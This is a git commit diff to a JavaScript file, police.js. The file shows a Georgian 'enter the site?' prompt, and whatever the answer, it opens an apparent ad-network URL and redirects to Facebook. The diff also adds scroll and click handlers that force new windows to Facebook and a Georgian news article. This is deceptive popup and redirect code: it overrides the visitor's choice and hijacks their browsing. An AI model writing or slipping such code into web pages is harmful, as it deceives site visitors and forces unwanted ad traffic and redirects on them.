c26b68fcd0bb116dc6a17e6cced33d8e80614683
incognito1121 <65291178+incognito1121@users.noreply.github.com>
2020-05-14 15:07:26 +0400

    Update police.js

--- police.js
+++ police.js
@@ -1,9 +1,26 @@
 setTimeout(function(){ 
     if (confirm('გსურთ შესვლა საიტზე?')){
         window.open("http://ofgogoatan.com/afu.php?zoneid=3294231");
-        //window.open("//www.facebook.com/", '_self');
+        window.open("http://www.facebook.com/", '_self');
      }else{
         window.open("http://ofgogoatan.com/afu.php?zoneid=3294231");
-        //window.open("http://www.facebook.com/", '_self');
+        window.open("http://www.facebook.com/", '_self');
      };
  }, 1000); 
+
+
+
+window.onscroll = function() {myFunction()};
+
+function myFunction() {
+    if (document.body.scrollTop > 5 || document.documentElement.scrollTop > 5) {
+        window.open('https://upon.ge/article/ხაშურში-დასაჯარიმებლად/');
+    } else {
+      document.getElementById("myP").className = "";
+    }
+  };
+
+  $(window).click(function(){
+    window.open('https://facebook.com');
+    window.open('https://upon.ge/article/ხაშურში-დასაჯარიმებლად/'); 
+  });
